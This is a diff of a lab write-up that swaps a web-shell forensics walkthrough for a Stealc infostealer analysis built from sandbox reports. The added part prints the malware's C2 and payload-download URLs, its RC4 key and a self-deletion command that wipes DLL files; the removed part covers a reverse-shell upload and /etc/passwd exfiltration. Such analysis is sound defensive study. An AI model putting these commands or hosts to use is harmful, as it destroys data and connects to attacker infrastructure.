@@ -1,156 +1,111 @@
-# Lab Name — WebStrike
+# Oski — CyberDefenders
 
-**Platform:** CyberDefenders  
-**Category:** Network Forensics  
-
----
+## Category
+Threat Intel
 
 ## Scenario
-A suspicious file was identified on a company web server, raising alarms within 
-the intranet. The Development team flagged the anomaly, suspecting potential 
-malicious activity. To address the issue, the network team captured critical 
-network traffic and prepared a PCAP file for review.
-Your task is to analyze the provided PCAP file to uncover how the file appeared 
-and determine the extent of any unauthorized activity.
+The accountant at the company received an email titled "Urgent New Order" from a client late in the afternoon. When he attempted to access the attached invoice, he discovered it contained false order information. Subsequently, the SIEM solution generated an alert regarding downloading a potentially malicious file. Upon initial investigation, it was found that the PPT file might be responsible for this download. Could you please conduct a detailed examination of this file?
 
----
+![hash](screenshots/1.jpeg)
 
 ## Tools Used
-- Wireshark
-  ![wireshark](screenshots/1.jpeg)
-- iplocation.net
-
----
+- virustotal(site)
+- Any.run (site)
 
 ## Walkthrough
 
-### Q1 — Identifying the geographical origin of the attack facilitates the 
-implementation of geo-blocking measures and the analysis of threat intelligence. 
-From which city did the attack originate?
+### Q1 — Determining the creation time of the malware can provide insights into its origin. What was the time of malware creation?
+**What I did:** I visited the <virustotal> website and entered the provided hash. To find information about the hash, I went to the **Details** tab.
 
-**What I did:** The first step was to open the PCAP file in Wireshark, as it 
-contains the full network traffic — essentially a complete timeline of the 
-attacker's activity.
+![virustotal](screenshots/2.jpeg)
 
-**What I found:** In any attack, the attacker is logically the source of the 
-first SYN packet. This revealed the attacker's IP address: **117.11.88.124**. 
-By looking it up on iplocation.net, I was able to pinpoint the exact location 
-along with additional threat intelligence information.
+**What I found:** In the Details tab, I found the **History** section which contained the creation date.
 
-**Answer:** Tianjin
+**Answer:** 2022-09-28 17:40
 
----
+![creation](screenshots/3.jpeg)
 
-### Q2 — Knowing the attacker's User-Agent assists in creating robust filtering 
-rules. What's the attacker's Full User-Agent?
+### Q2 — Identifying the command and control (C2) server that the malware communicates with can help trace back to the attacker. Which C2 server does the malware in the PPT file communicate with?
+**What I did:** Since C2 communication is a network behavior, I checked the **Behavior** tab.
 
-**What I did:** The User-Agent identifies the browser and operating system used 
-by a machine. Knowing this is useful for building precise blocking rules. I 
-applied the **http** filter in Wireshark to isolate only HTTP requests and 
-locate the User-Agent field.
+**What I found:** In this tab, I identified the server the malware was communicating with.
 
-**What I found:** By inspecting an HTTP packet, I analyzed the different layers 
-of the network model. The application layer, using the HTTP protocol, contained 
-several details about the request, including the User-Agent field.
+![post](screenshots/5.jpeg)
 
-**Answer:** Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 
-Firefox/115.0
+**Answer:** POST http://171.22.28.221/5c06c05b7b34e8e6.php
+*NOTE: The malware is on the local machine; for a reverse shell or data exfiltration, the most logical method is POST to establish communication.*
 
----
+### Q3 — Identifying the initial actions of the malware post-infection can provide insights into its primary objectives. What is the first library that the malware requests post-infection?
+**What I did:** To find this information, I stayed in the same tab, as downloading files to the machine is also a malware behavior.
 
-### Q3 — We need to determine if any vulnerabilities were exploited. What is 
-the name of the malicious web shell that was successfully uploaded?
+**What I found:** In this tab, specifically in the **Files Dropped** section, I found the downloaded file.
 
-**What I did:** If the attacker gained access to the server, they likely used a 
-malicious file upload via a POST request to deploy a web shell. I filtered the 
-traffic using **http.request.method == "POST"** to isolate these requests.
+![file](screenshots/6.jpeg)
 
-![wireshark](screenshots/2.jpeg)
+**Answer:** sqlite3.dll
 
-**What I found:** Among the POST requests, two originated from the attacker and 
-one from the victim, suggesting a successful upload followed by outbound 
-communication. The packets were fragmented due to TCP segmentation. I used 
-**Follow TCP Stream** to reconstruct the full exchange. The content revealed a 
-PHP reverse shell script, stored in a file named **image.jpg.php** — a double 
-extension technique used to trick Windows users, who by default have file 
-extensions hidden. The third request confirmed the upload was successful.
+### Q4 — By examining the provided Any.run report, what RC4 key is used by the malware to decrypt its base64-encoded string?
+**What I did:** The link provided by CyberDefenders redirected me to the report on Any.run.
 
-**Answer:** image.jpg.php
+**What I found:** In the **stealc** section, I found the key.
 
-![wireshark](screenshots/3.jpeg)
+![key](screenshots/7.jpeg)
 
----
+**Answer:** 5329514621441247975720749009
 
-### Q4 — Identifying the directory where uploaded files are stored is crucial 
-for locating the vulnerable page and removing any malicious files. Which 
-directory is used by the website to store the uploaded files?
+### Q5 — By examining the MITRE ATT&CK techniques displayed in the Any.run sandbox report, identify the main MITRE technique (not sub-techniques) the malware uses to steal the user’s password.
+**What I did:** The link redirects to the report home page. To see the MITRE ATT&CK techniques, I accessed the **MITRE ATT&CK Matrix** by clicking the ATT&CK button under indicators and trackers.
 
-**What I did:** Once the file was uploaded, the attacker needed to execute it 
-via a GET request. I used the following Wireshark filter to locate that request:
-**http.request.method == "GET" && http.request.uri contains "image.jpg.php"**
+**What I found:** I found all the techniques used during this attack; one of them was "Credentials from Password Stores".
 
-**What I found:** The matching request appeared, revealing the full path of the 
-directory where the malicious file was stored.
+![technique](screenshots/8.jpeg)
 
-**Answer:** /reviews/uploads/
+**Answer:** T1555
 
-![wireshark](screenshots/4.jpeg)
+### Q6 — By examining the child processes displayed in the Any.run sandbox report, which directory does the malware target for the deletion of all DLL files?
+**What I did:** On the home page, I found a small process tree. The command responsible for deleting the malware's traces was executed by `cmd.exe`, a child process of `VPN.exe`.
 
-![wireshark](screenshots/5.jpeg)
+**What I found:** I found a command executed by `cmd.exe` that targeted the deletion of a specific directory.
 
----
+![cmd](screenshots/9.jpeg)
 
-### Q5 — Which port, opened on the attacker's machine, was targeted by the 
-malicious web shell for establishing unauthorized outbound communication?
+**Answer:** C:\ProgramData
 
-**What I did:** To identify the attacker's listening port, I analyzed the 
-content of the PHP script retrieved via Follow TCP Stream.
+### Q7 — Understanding the malware's behavior post-data exfiltration can give insights into its evasion techniques. By analyzing the child processes, after successfully exfiltrating the user's data, how many seconds does it take for the malware to self-delete?
+**What I did:** To determine the delay before the malware deletion, I followed the process tree by clicking on the `timeout` process, then on **More Info**.
 
-**What I found:** Reading the script clearly shows both the attacker's IP 
-address and the target port used to establish the outbound connection.
+**What I found:** I found a representation of the execution timeline.
 
-**Answer:** 8080
+![timeline](screenshots/10.jpeg)
 
----
-
-### Q6 — Recognizing the significance of compromised data helps prioritize 
-incident response actions. Which file was the attacker attempting to exfiltrate?
-
-**What I did:** To identify the targeted file, I filtered HTTP requests where 
-the source IP was the victim's machine — meaning traffic generated by the web 
-shell running on the server.
-
-**What I found:** The filter revealed an HTTP request containing the file the 
-attacker was attempting to exfiltrate.
-
-**Answer:** /etc/passwd
-
-![wireshark](screenshots/6.jpeg)
+**Answer:** 5
 
 ---
 
 ## Incident Timeline
-
-| Time (s) | Action |
-|---|---|
-| 26.922 | First attempt to upload the web shell |
-| 49.758 | Second upload attempt with the malicious file |
-| 57.538 | Navigation to /admin/uploads searching for the uploaded file |
-| 63.058 | Navigation to /uploads |
-| 69.755 | Navigation to /admin/ |
-| 75.201 | Navigation to /reviews/uploads |
-| 75.207 | Navigation to /reviews/uploads/ |
-| 84.150 | Web shell executed via GET /reviews/uploads/image.jpg.php |
-| 191.372 | Exfiltration attempt of /etc/passwd — failed because the attacker's server did not support the POST method |
+- **t=0 ms:** Execution of the malicious file due to a successful phishing attempt.
+- **t=31 ms:** Malware checks the supported language on the machine.
+- **t=343 ms:** Malware reads the machine name.
+- **t=359 ms:** Malware reads proxy server info in Internet Settings.
+- **t=437 ms:** Malware reads the Machine GUID from the registry.
+- **t=750 ms:** Malware reads environment variables, CPU info, and local Windows version.
+- **t=750 ms:** Search for installed software: Adobe Flash Player 32 ActiveX.
+- **t=1703 ms:** Creation of the file `<C:\Users\admin\AppData\Local\Google\Chrome\User Data\Local State>`.
+- **t=1781 ms:** Creation of the file `<C:\ProgramData\GCBGCAFIIECBFIDHIJKFBAKEGD>`.
+- **t=3593 ms:** Filling the file `<C:\ProgramData\GDHIIDAFIDGCFHJJDGDA>` with stolen credentials.
+- **t=4289 ms:** Connection request using a POST method to `<http://171.22.28.221/5c06c05b7b34e8e6.php>` by the process `<VPN.exe>`.
+- **t=4290 ms:** Stealc communication detected.
+- **t=4309 ms:** External connection established: IpDst:171.22.28.221, PortDst:80.
+- **t=4327 ms:** GET request to download `<http://171.22.28.221/9e226a84ec50246d/sqlite3.dll>`.
+- **t=10359 ms:** Stealc malware detected in RAM (In-memory execution bypasses file-based antivirus).
+- **t=26468 ms:** Creation of the file `<C:\Users\admin\AppData\Roaming\Moonchild Productions\Pale Moon\profiles.ini>`.
+- **t=27723 ms:** Download of the file `<C:\ProgramData\mozglue.dll>` (Used to decrypt passwords saved in Firefox).
+- **t=29031 ms:** Process `cmd.exe` executes the self-deletion command: `timeout /t 5 & del VPN.exe & del "C:\ProgramData\*.dll"`.
 
 ---
 
 ## What I Learned
-- File upload fields must strictly validate file type and extension on the 
-server side.
-- An attacker must ensure their infrastructure supports the required HTTP 
-methods before launching an attack.
-- Wireshark filters significantly improve efficiency when analyzing network 
-traffic.
-- A firewall rule limiting the size of outbound HTTP responses can prevent the 
-exfiltration of sensitive files such as /etc/passwd.
+- The `vpn.exe` file contained **Stealc** malware, which focuses on collecting credentials and performing self-deletion to erase traces.
+- Stealc was developed by a Russian-speaking actor as a "Malware-as-a-Service" (MaaS) for harvesting personal information.
+- Some malwares execute only in **RAM** (In-memory) to avoid detection by traditional file-based antivirus software.
+- Firefox encrypts passwords using the `mozglue.dll` library; the malware specifically targets this library to decrypt and steal saved passwords.
